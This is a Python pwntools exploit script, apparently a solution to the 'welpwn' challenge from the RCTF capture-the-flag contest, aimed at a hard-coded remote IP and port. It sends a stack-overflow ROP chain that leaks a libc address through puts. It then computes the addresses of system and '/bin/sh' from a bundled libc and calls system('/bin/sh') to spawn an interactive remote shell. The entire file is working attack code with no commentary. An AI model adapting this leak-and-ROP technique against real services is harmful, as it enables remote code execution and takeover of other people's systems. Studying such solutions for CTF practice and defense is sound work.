from pwn import *
#p = process('./welpwn0')
#p = remote('127.0.0.1', 6666)
p = remote('180.76.178.48', 6666)
pop_rdi_ret = 0x00000000004008a3 
pop_rsi_pop_ret = 0x00000000004008a1 
write_plt = 0x04005B0
got = 0x601018 
main = 0x04007CD
add_esp8 = 0x0000000000400585
pop5_ret = 0x000000000040089c 
puts_plt = 0x04005A0
raw_input()
print p.recvuntil('RCTF')
def leak(addr):
#	print p.recvuntil('RCTF')

	payload  = ''
	payload = payload.ljust(0x16, 'a')
	payload += 'bc'
	payload += p64(pop5_ret)
	payload += p64(pop_rdi_ret)
	payload += p64(addr)
	payload += p64(puts_plt)
	payload += p64(main)
#	payload += p64(main)
	#print 'hex',payload.encode('hex')
	p.sendline(payload)
	
	data = p.recvuntil('RCTF')
	data = p.recv(1024)
	data += p.recv(1024)
	#data += p.recv(1024)
	#data += p.recvuntil('We')
	#print 'data',data
	print '----------------'
	print data
	print 'data hex:',data.encode('hex')
	for j in range(len(data)):
		if data[len(data)-j -1 ] == '\n':
			n = len(data)-j-1
			break
	i = int(data.find('\x9c\x08\x40')) + 3
	#print 'n:%d i:%d'%(n,i)
	if n-i>8:
		print 'over flow'
		n = i + 8
		print 'n:%d i:%d'%(n,i)
	print 'hexhex:',data[i:n].encode('hex')
	ad = u64(data[i:n].ljust(8, '\x00'))
	print hex(addr), ' -> ',hex(ad)
	print '----------------'
	return p64(ad)
write_r = leak(got+8)
write_r = u64(write_r)


libc = ELF('libc-2.19_15.so')
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
iter = libc.search('/bin/sh')
binsh_l = iter.next()
write_l = libc.symbols['write']
system_l = libc.symbols['system']
system_r = system_l - write_l + write_r
binsh_r = binsh_l - write_l + write_r
print 'system_r',hex(system_r)
print 'system_l',hex(system_l)
print 'binsh_r',hex(binsh_r)

payload  = ''
payload = payload.ljust(0x16, 'a')
payload += 'bc'
payload += p64(pop5_ret)
payload += p64(pop_rdi_ret)
payload += p64(binsh_r)
payload += p64(system_r)
payload += p64(main)
p.sendline(payload)

p.interactive()

